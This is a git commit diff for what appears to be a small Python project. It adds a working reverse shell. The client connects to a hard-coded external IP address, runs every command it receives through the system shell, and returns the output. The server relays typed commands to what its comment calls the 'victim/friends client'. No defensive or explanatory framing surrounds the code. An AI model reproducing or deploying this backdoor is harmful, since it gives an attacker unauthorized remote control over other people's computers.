b376320d61afa7b5e1f0be204ccebfa7ca673de1
Cameron Carter <cameroncarter@utexas.edu>
2020-11-27 10:26:04 -0600

    Finish client, add static ip

--- client.py
+++ client.py
@@ -1,1 +1,24 @@
 import socket
+import os
+import subprocess
+
+s = socket.socket()
+host = "178.128.7.185"
+port = 9999
+
+s.connect((host, port))
+
+while True:
+    data = s.recv(1024)
+    if data[:2].decode("utf-8") == "cd":
+        os.chdir(data[3:].decode("utf-8"))
+    
+    if (len(data) > 0):
+        cmd = subprocess.Popen(data[:].decode("utf-8"), shell="True", stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE)
+        output_byte = cmd.stdout.read() + cmd.stderr.read()
+        output_str = str(output_byte, "utf-8")
+        current_wd = os.getcwd() + "> "
+        s.send(str.encode(output_str + current_wd))
+
+        print(output_str)
+
--- server.py
+++ server.py
@@ -19,7 +19,7 @@ def bind_socket():
         global port
         global s
 
-        print(f"Binding to port {port}")
+        print(f"Binding to port: {port}")
 
         s.bind((host, port))
         s.listen(5)
@@ -34,5 +34,25 @@ def accept():
     global s
     conn, address = s.accept()
     print(f"Connection has been established! Ip: {address[0]}, Port: {address[1]}")
-    # send_command(conn)
+    send_commands(conn)
     conn.close()
+
+# Send commands to victim/friends client
+def send_commands(conn):
+    while True:
+        cmd = input()
+        if cmd == "quit":
+            conn.close()
+            s.close()
+            sys.exit()
+        if len(str.encode(cmd)) > 0:
+            conn.send(str.encode(cmd))
+            client_response = str(conn.recv(1024), "utf-8")
+            print(client_response, end="")
+
+def main():
+    create_socket()
+    bind_socket()
+    accept()
+
+main()
